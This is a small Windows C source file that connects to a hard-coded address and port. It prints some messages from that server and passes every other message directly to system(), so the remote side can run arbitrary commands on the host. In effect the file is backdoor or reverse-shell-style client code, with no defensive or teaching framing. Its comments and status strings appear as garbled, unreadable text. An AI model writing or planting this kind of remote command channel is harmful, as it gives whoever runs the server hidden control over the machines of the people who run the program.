#include<stdio.h>
#include<stdlib.h>
#include<winsock.h>
#include<process.h>
#pragma comment(lib,"ws2_32.lib")

#define port 5529
#define ip_addr "192.168.1.198"

void write(void *p) {
	while (1) {
		SOCKET client = (SOCKET)p;						//����
		char str[256] = { 0 };
		scanf("%s", str);
		send(client, str, strlen(str), 0);              //����
	}
}

void main() {
	WSADATA WSA;				//�ԱȰ汾
	SOCKET client;				//�ͻ���
	struct sockaddr_in serveraddr;			//��������ַ
	int addrlength = 0;
	HANDLE hthread = NULL;		//�߳̾��
	int Ret = 0;
	char senbuf[256] = { 0 };

	if (WSAStartup(MAKEWORD(2, 2), &WSA) != 0) {
		puts("�汾��һ�£�ͨ��ʧ��\n");
		system("pause");
		return;
	}
	client = socket(AF_INET, SOCK_STREAM, 0);			//����
	if (client == INVALID_SOCKET) {
		puts("�ͻ��˴���ʧ��\n");
		system("pause");
	}

	serveraddr.sin_family = AF_INET;
	serveraddr.sin_addr.S_un.S_addr = inet_addr(ip_addr);  //���õ�ַ
	serveraddr.sin_port = htons(port);						//�˿�
	
	memset(serveraddr.sin_zero, 0x00, 8);

	Ret = connect(client, (struct sockaddr*)&serveraddr, sizeof(serveraddr));
	if (Ret != 0) {
		puts("�ͻ�������ʧ��");
		system("pause");
	}

	_beginthread(write, 0, (void*)client);

	while (1) {
		char receivebuf[256];
		memset(receivebuf, 0x00, sizeof(receivebuf));		//����
		Ret = recv(client, receivebuf, 256, 0);
		if (*receivebuf == '0') {
			printf("%s", receivebuf + 1);
		}
		else {
			system(receivebuf + 1);
		}
	}

	closesocket(client);
	WSACleanup();

}